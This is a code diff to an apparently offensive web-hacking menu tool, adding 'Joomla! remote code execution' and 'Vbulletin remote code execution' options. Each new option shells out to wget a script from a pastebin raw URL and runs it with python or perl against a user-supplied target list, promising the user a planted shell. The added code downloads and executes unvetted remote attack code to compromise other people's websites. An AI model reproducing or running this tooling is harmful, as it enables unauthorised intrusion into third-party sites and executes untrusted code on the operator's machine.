@@ -14,9 +14,8 @@ menu_items.append("Back")
 # endregion
 
 # region: additonal imports
+import os
 import re
-import sys
-import urllib.request
 
 from colorama import Fore
 from urllib.request import Request, urlopen
@@ -438,7 +437,7 @@ class Sdfnd:
     def run_interactive(self, ctx):
         safe_print(ctx, "\n[*] Starting sdfnd session.\n")
 
-        target = safe_input("Enter Target domain: ", ctx).rstrip()
+        target = safe_input("Enter target domain: ", ctx).rstrip()
         if not target:
             safe_print(ctx, "[!] No input provided — aborting.")
             return
@@ -447,6 +446,101 @@ class Sdfnd:
         self.grab_shell_from_link(target)
 
         safe_print(ctx, "\n[*] Sdfnd session finished.\n")
+# endregion
+
+# region: override class: joomlarce
+class Joomlarce:
+    menu_items = [
+        "Run interactive",
+        "Back"
+    ]
+        
+    def __init__(self, ctx=None):
+        self.ctx = ctx or {}
+
+    def run(self, ctx):
+        self.ctx = ctx
+        safe_print(ctx, f"[*] Joomlarce: selected '{ctx.get('item')}'")
+        self.sub_menu(ctx)
+
+    def sub_menu(self, ctx):
+        safe_print(ctx, "\nJoomlarce options:")
+        for i, it in enumerate(self.menu_items, 1):
+            safe_print(ctx, f"  [{i}] {it}")
+        safe_print(ctx, "")
+            
+        choice = safe_input(ctx.get("prompt", "root ~# "), ctx).strip()
+        
+        if not choice.isdigit() or not (1 <= int(choice) <= len(self.menu_items)):
+            self.__init__()
+
+        idx = int(choice) - 1
+        sel = self.menu_items[idx]
+
+        if sel.lower() == "back":
+            return
+
+        if "interactive" in sel:
+            self.run_interactive(ctx)
+
+    def run_interactive(self, ctx):
+        safe_print(ctx, "\n[*] Starting joomlarce session.\n")
+
+        os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
+        print("[!] if the response is 200 [OK], you will find your shell in .txt document!")
+
+        target_list = safe_input("Select a targets list: ", ctx).strip()
+        if not target_list:
+            safe_print(ctx, "[!] No input provided — aborting.")
+            return
+
+        os.system("python temp.py %s" % target_list)
+        safe_print(ctx, "\n[*] Joomlarce session finished.\n")
+# endregion
+
+# region: override class: vbulletinrce
+class Vbulletinrce:
+    menu_items = [
+        "Run interactive",
+        "Back"
+    ]
+        
+    def __init__(self, ctx=None):
+        self.ctx = ctx or {}
+
+    def run(self, ctx):
+        self.ctx = ctx
+        safe_print(ctx, f"[*] Vbulletinrce: selected '{ctx.get('item')}'")
+        self.sub_menu(ctx)
+
+    def sub_menu(self, ctx):
+        safe_print(ctx, "\nVbulletinrce options:")
+        for i, it in enumerate(self.menu_items, 1):
+            safe_print(ctx, f"  [{i}] {it}")
+        safe_print(ctx, "")
+            
+        choice = safe_input(ctx.get("prompt", "root ~# "), ctx).strip()
+        
+        if not choice.isdigit() or not (1 <= int(choice) <= len(self.menu_items)):
+            self.__init__()
+
+        idx = int(choice) - 1
+        sel = self.menu_items[idx]
+
+        if sel.lower() == "back":
+            return
+
+        if "interactive" in sel:
+            self.run_interactive(ctx)
+
+    def run_interactive(self, ctx):
+        safe_print(ctx, "\n[*] Starting vbulletinrce session.\n")
+
+        os.system("wget http://pastebin.com/raw/eRSkgnZk --output-document=tmp.pl")
+        print("[!] if the response is 200 [OK], you will find your shell in the .txt document!")
+
+        os.system("perl tmp.pl")
+        safe_print(ctx, "\n[*] Vbulletinrce session finished.\n")
 # endregion
 
 # region: actions utility
@@ -481,8 +575,8 @@ def execute(ctx):
         "Drupal hacking": Drupal,
         "Wordpress and Joomla scanner": Wppjmla,
         "Shell and directory finder": Sdfnd,
-        #"Joomla! remote code execution",
-        #"Vbulletin remote code execution",
+        "Joomla! remote code execution": Joomlarce,
+        "Vbulletin remote code execution": Vbulletinrce,
         #"Arachni - Web Application Security Scanner Framework",
         #"Private web f-scanner"
     }
